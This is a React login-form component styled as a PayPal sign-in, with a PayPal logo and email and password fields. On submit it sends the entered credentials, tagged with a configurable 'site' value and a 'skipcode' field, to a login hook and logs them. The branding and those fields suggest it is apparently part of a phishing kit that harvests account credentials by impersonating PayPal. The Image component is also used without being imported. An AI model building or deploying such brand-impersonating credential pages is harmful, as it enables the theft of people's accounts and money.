import { Field, Form, Formik } from "formik";
import useMockLogin from "../hooks/useMockLogin";
import { site } from "../config";
import { useState } from "react";
import { toast } from "react-toastify";

function LoginForm({ setShowForm}) {

  const initialvalues = {
    email: "",
    password: "",
    remember: "",
  };

  const { login } = useMockLogin();

  const handleSubmit = (values, formik) => {
    const { email, password} = values;

    // console.log("values", values);
    // return;

    const submitValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
    };

    login(submitValues, formik);
    setShowForm(true)
    console.log(submitValues);
  };

 

  return (
    <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
        <div className="relative    w-[80px] h-[80px] ">
            <Image
              src="/images/paypal-logo.svg"
              alt="avatar"
              fill
              className="object-cover ml-[120px]"
            />
          </div>

      <div className="mt-5">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="">
              <Field
                className="w-full text-lg px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
                placeholder="Your email"
                name="email"
                type="email"
                required
              />
             
              
                  <Field
                    className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
                    placeholder="Password"
                    name="password"
                    type="password"
                    autoComplete="on"
                    required
                  />

        
                  <button
                    type="submit"
                    className="mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
                  >
                    Log in
                  </button>
              
             
            </Form>
          )}
        </Formik>
      </div>
    </div>
  );
}

export default LoginForm;
